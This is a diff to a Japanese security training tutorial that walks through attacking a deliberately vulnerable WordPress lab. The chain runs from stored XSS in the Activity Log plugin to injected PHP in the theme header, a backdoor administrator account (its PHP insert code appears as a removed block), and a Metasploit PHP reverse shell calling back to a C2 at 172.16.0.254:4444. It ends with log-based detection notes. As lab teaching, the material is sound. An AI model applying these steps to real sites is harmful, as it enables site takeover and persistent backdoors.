@@ -297,8 +297,8 @@ WordPressにはksesというセキュリティ機能が有り、XSSに繋がる�
 
 攻撃ステージはExploit（脆弱性の利用）です。
 
+あなたはksesの影響を受けずにXSSが出来るような手段を必要としています。
 他に利用できる脆弱性は無いでしょうか？
-ksesの影響を受けずにXSSが出来るような手段が必要です。
 
 このセッションでは、あなたは敢えて脆弱性のあるPluginをWordPressにインストールしたはずです。
 意図したとおりに[Activity Log Plugin](https://ja.wordpress.org/plugins/aryo-activity-log/)がインストールされていれば次の攻撃を試す価値があります。
@@ -308,8 +308,6 @@ ksesの影響を受けずにXSSが出来るような手段が必要です。
 ```
 U2FsdGVkX1+coBOcBKCzqamqzRdhiX1JjgOV4C8E4yI9RaEtIXVyOLV057UnGTF79q30sZ85xxYwjpjy8C9SAgFmyNfoUZ0EaPHVUbj0P2z1vVOL/LFwLJ+I0sKOprBT0CLoopq448a3AJM2OocUas3tOdGanxZvYKwk5Q1cD4uKTlKp2vz70uNViueyTisAhKradz0YaeEO/7sVw8u9N/xqXUrZLe0CJl8bBLnKGM2vo4t4+eBHHMejBLc7f5ASrKUYazUzYpNVs/aJRronilUT13n4an0eI/kiZd3rgBSY9MkNklpYqnl9pkS4Zyj8
 ```
-
-1度のリクエストで注入できるスクリプトの長さは55byteです。
 
 ![](/images/wordpress/fiddler04.png)
 
@@ -335,15 +333,23 @@ Activity LogのSettingsからReset Databaseを選択するだけです。
 現実の攻撃はこんなチュートリアルでは済みません。
 ここからは、どのようなスクリプトを用意すればターゲットに致命的なバックドアを作成できるのかを学びます。
 
-格納型XSSの手順を参照しながら次のワンライナーを書き込みましょう。
-XSSを起動するにはActivity Logを表示する必要があります。
-本来は管理者のアクセスを待つ場面ですが、このセッションではあなたが管理者に代わってXSSを起動してください。
-
+今回、注入したいスクリプトは次の通りです。
 悪用を防ぐためopenssl 1.0.2k-fips aes256で暗号化してあります。パスワードは弊社名の略称です。
 
 ```
-U2FsdGVkX18/WB2d2+ipDPcSVsIZ62Px7VNRwC0LmdXjCO0CeknoJqnPW/Dnzn9YcikfpcrEWVbdzBKbyo5Cn3OfIkYgpJvdvPXLq1Doww8OYjA7H7EdFKFRRl5LhMGHdx3Xn9QM0Sc0uvkCn27E+pdxoUJRniX9uQd9frMynipZsOWOU6pxtqAZEd3kI3/LDOUjJeubosY8/05nct4bfVzGf/YZO5qf6v6MAOHEeCIqqQ7vZi2FyLrTte8eMkkpjm2soYrcUWRafcX/xyYZsu4YsyPX3DjBB+wzUKzo+0eho4b+Ou3h2KPwpeZNdSaAk8HcGj4ncoQWgXDasCekndmG2Vc5SSwsZkW0Pn47JjsSheY0EJL6P6KCyMuv4Bf1fGKu5YQUMo5hpWBKQZaEGDClw3I68jUBupjVPlXJl6oYjhq3IOl70+QtA1qbsBTOzz1vRtSL6bylrbcxsPjlQA==
+U2FsdGVkX1+Rh7jbi2fXs9n9B5JhXI6qy+M8rW0VhErb+AM8ZkAfh9AxkBkqBtCjjr+UNy7Hd9c0bQn286AGW+aIYi+SZEUzFxhZLso3+sNAqbWv9JE5R3P4WyENMlfJKQZrpE76qj5ijJAEQATCMj6cPEXLXv1lTaNyFptwlJ0ZIynLJxqUGunKv8miYZXywT5MgNXbJt/0hX9ktfqnClcmOwH/XhI0mEoYHxOVoMtOc1rd8xJmB+SpLUombHH8M10Z5vRoU3m5VdrYZsbHJTP07LyTGCRZvMdqkyKQbUiYA9ouyibOg2WEIRdBNWRxtTH3vR0DE0X09nmS+e0p5iEQ16YP93fLLQtbgcmRyEAyLQaXHvS2DXAuwhFsx/osZ9h9dPu1s6IzdNv/JpQ9nJx9xViuht9AWMIryVPLMXtVT93UIUvKLlGslVpJLyPg5PghI1Lpc0PXgTNdlHuSFg==
 ```
+
+ただしActivity LogのExploitで注入できるスクリプトの長さは1件あたり55byte以下です。
+しかも一部の文字がサニタイズされるためXSSチートシート等を参照して対策をとる必要があります。
+この制約下で攻撃を成功させるために次の戦術を採用することにしましょう。
+
+1. スクリプトを配布するためのWebサーバを用意する
+2. 用意したWebサーバにスクリプトを設置する
+3. Activity Logに`<script src=設置したスクリプト></script>`を注入する
+
+XSSを起動するにはActivity Logを表示する必要があります。
+本来は管理者のアクセスを待つ場面ですが、このセッションではあなたが管理者に代わってXSSを起動してください。
 
 ダッシュボードから 外観>テーマの編集>テーマヘッダー を確認するとXSSで注入されたphpコードが確認できます。
 テーマヘッダーはWordPressのヘッダーを出力するためのphpファイルです。
@@ -362,47 +368,15 @@ phpinfoの出力についてはセッションの最初に確認しましたね�
 
 任意コードが実行できたならターゲットを完全に掌握するまであと一歩です。
 WordPressデータベースを操作してあなただけが使える特権ユーザーを作成してみましょう。
-次のワンライナーを使用してください。
 
+先ほど用意したスクリプトファイルを次の通り書き換えてください。
 悪用を防ぐためopenssl 1.0.2k-fips aes256で暗号化してあります。パスワードは弊社名の略称です。
+
 ```
-U2FsdGVkX1+lrU5qd6vLjVmy8kjGOn4THRV7StgjfP34q0Vfh6ibLsS3G8FpfL60kpkre4Nz8oj/EBny4kaQ6+6AKbv+ZJkyifomgjU/cvnsVpLHcRvF6f7YK2YyWQoWbhHc9iQuij0P6m+kOnkaJ4kXHS1XV8Je4VYeKZsMRZDnlO2XEKgV31Ial9tpPwhuQXLyt+VRh68AV3i9/b6uD4PuLloLvzcNZNgUm02AyDHvvB1kvhI2hvj/yecVHEGgzc22HgoRVknDrCa5kvSGZZcsk7XbvrKb9d4KNfcauey1nFa6YLhrOGocsTqZZ7iR4/cknhpYgOwWeh1MQVXuOxQ9sy3dVluxj965z0/w93191UtQX279D/Dn6xDVgBoncT0MFjb20ZU92K/3YSb4e1Ije6zNgoDXGDCotrCSPvWyLGPEiCBS1s1NfoWpqxXa5S2ud3YZ2GJluLsfQnLIyj21kSZwZwIJ6c/RvqBXK7EgUebfUYPK/y+oDpIz2VGNwGus5QJsfQ1Du8S3poMLAEIFBE6hSsrkwauW//b4JiL0TjzL+vLHHfYLJ7rLPiZL6+ZGvgh057GrD2hFoL4GHNFlNfuGONfSMkYy7D3tNI8ntUrFj6aO3L90lN2Klh1F33JlwcTLSKTQ+i9FrLUOr8YuWddJfLzyC/XiDKc1fO/dNDn0rkZB2uTphS0oW3MS0bnfWtkITvjTFxIhyaY/iyyYXl9Vx54bbSGY/r2BxfmG4+IXSbdSoOXByhxhQrfXiVwTB0n59BkJYzWP3M+2ivqu2g7Vg69aFN40vUhisJNAwDAnoRgGU+96Iz2kx/6pLQibqfHIy4qUIS2nq8nv5g==
-```
-↓ 参考のためにphpコード部を整形
-```
-<?php
-$wpdb->insert(
-  'wp_users',
-  array(
-    'ID' => 999,
-    'user_login' => 'b@ckd00r',
-    'user_pass' => md5('b@ckd00r')
-    ),
-  array(
-    '%d',
-    '%s',
-    '%s'
-    )
-  );
-$wpdb->insert(
-	'wp_usermeta',
-	array(
-		'umeta_id' => 9999,
-		'user_id' => 999,
-    'meta_key' => 'wp_capabilities',
-    'meta_value' => 'a:1:{s:13:\"administrator\";b:1;}'
-	),
-	array(
-    '%d',
-    '%d',
-    '%s',
-    '%s'
-	)
-);
-?>
+U2FsdGVkX1/n5qm6J2A2HGhAjkCvvB4kYURpJii4rxjey7zqupEtg3zdiGi1srmM8cOon8y4ueEfZBzYU51ajcumB0L3B53WdU4XtHYvM2Gn0QuisNcU0E69QedesS/vfluTNoCUd1lh83o7+39FB32auUXdiBBrFEcALstugMg+ui+RKLNeQKGFKp6ckAI+NZyY4gE8HDfDvsYlQ0jtbd7ZBKAgY8KpBh00BUl+XGeAp8V8rGqQSQhhVAOXAXEz9WEqi8N2nBkR73ueeY2sLZDejGVsH+vob/iGOdUNTHImkvDtGQv/eLanPeKM6+Uo7FirOgtI79WH6AHP5IhY8Bmc6l86baH9djDyOlywcczEBm+Ynb+LwXYjKGgpsdoKfftPuXcul8TF2MGMVKsqTAx2M0+7IGRZHFr8lOcmXXN7T05cMWq7JKQhH2GnlWTLVZzcimLo7vOYo96a8yBzqskL2U6M2HzPulYMhZ4+LjVrC7saa3fxa7/3JfFjkJumcppimKqp7CxEKzZ2hykxTbuNLmSZ2BS/5XeAa/NH0eSZ/ucy3T/ngouxzRm8Md5YK5L/pKLdcvBTb+4B5PQQrPD4NywEKmjs7h2t9UiQRuARsQ+UzZlGoS1UoyanGVkeefKVBbSsqA8tv1s9LhVY9o5kkjdf2zwI9KNvS0XgM2cf7gVDMLn5FTZtwfMT5crIXyJtrFdkEQWclHxAogYQYdheXbHWKGlAEhDeByfxuXDtTkJP1vvPqx3jkigt71+ESR5REsp9czmb8xJBbUuVuSnUR/qqOL23LJ7gG7q0qNvMTWiK5fidLKrHvu5AIbfg
 ```
 
-Activity LogからXSSを起動したらWordPressから一旦ログアウトしてください。
+Activity LogからXSSを起動し、何らかのページに含まれるテーマヘッダを表示させたら、WordPressから一旦ログアウトしてください。
 そして、今作った特権ユーザーアカウントでWordPressにログインできることを確認しましょう。
 
 ![](/images/wordpress/xss03.png)
@@ -420,7 +394,7 @@ Activity LogからXSSを起動したらWordPressから一旦ログアウトし�
 Kali Linuxを起動してphpのリバースシェルを生成しましょう。
 次の例ではC2サーバが172.16.0.254:4444でコネクトバックを待ち受けることを想定しています。
 
-複雑なコードなのでXSSを介して書き込むことは困難です。
+複雑なコードなのでXSSを介して書き込むことは難しいかもしれません。
 あなたは既に特権ユーザーとしてダッシュボードにログインすることが出来るはずです。
 404.phpなどを編集して直接phpコードを書き込みましょう。
 
@@ -455,16 +429,44 @@ msf exploit(handler) > exploit
 
 すべての準備は整いました。
 Webブラウザからリバースシェルが設置されたphpファイルにアクセスしましょう。
-Metasploitのコンソールを確認するとコネクトバックが成立していることが分かります。
 
 ![](/images/wordpress/reverse03.png)
 
+Metasploitのコンソールを確認するとコネクトバックが成立していることが分かります。
+
+![](/images/wordpress/metasploit.png)
+
 # 検知と防衛
+
+## /var/log/httpd/access_log
+
+wp-login.phpへの攻撃の痕跡
+
+```
+egrep wp-login.php /var/log/httpd/access_log
+
+10.0.2.2 - - [08/Nov/2018:22:15:03 +0900] "POST /4.7.0/wp-login.php HTTP/1.1" 200 3289 "-" "Fiddler"
+10.0.2.2 - - [08/Nov/2018:22:30:56 +0900] "POST /4.7.0/wp-login.php HTTP/1.1" 200 3289 "-" "Fiddler"
+10.0.2.2 - - [08/Nov/2018:22:31:39 +0900] "POST /4.7.0/wp-login.php HTTP/1.1" 200 3289 "-" "Fiddler"
+```
+
+テンプレート改ざんの痕跡
+```
+pwd
+/var/www/html/4.7.0/wp-content/themes/twentyseventeen
+
+ls -lat
+合計 524
+-rw-r--r--. 1 apache apache   1113 11月  8 23:54 404.php
+-rw-r--r--. 1 apache apache   2011 11月  8 23:43 header.php
+drwxr-xr-x. 5 apache apache     88 12月  7  2016 ..
+drwxr-xr-x. 5 apache apache   4096 12月  7  2016 .
+```
 
 # まとめ
 
 このセッションを通じてあなたはWordPressでWebサイトを構築する最低限のノウハウを得ました。
-本番環境では更にセキュリティに気を配った構築と運用を心がける必要がありますが、検証環境としてはこれで十分なはずです。
+本番環境では更にセキュリティに気を配った構築と運用を心がける必要がありますが、検証環境としては足りるはずです。
 知識を得るだけでなく、積極的に検証することでノウハウを定着させてください。
 
 あなたはサイバーキルチェーンの概念を知り、WordPressに対する具体的な攻撃手段の一部を知ることが出来ました。
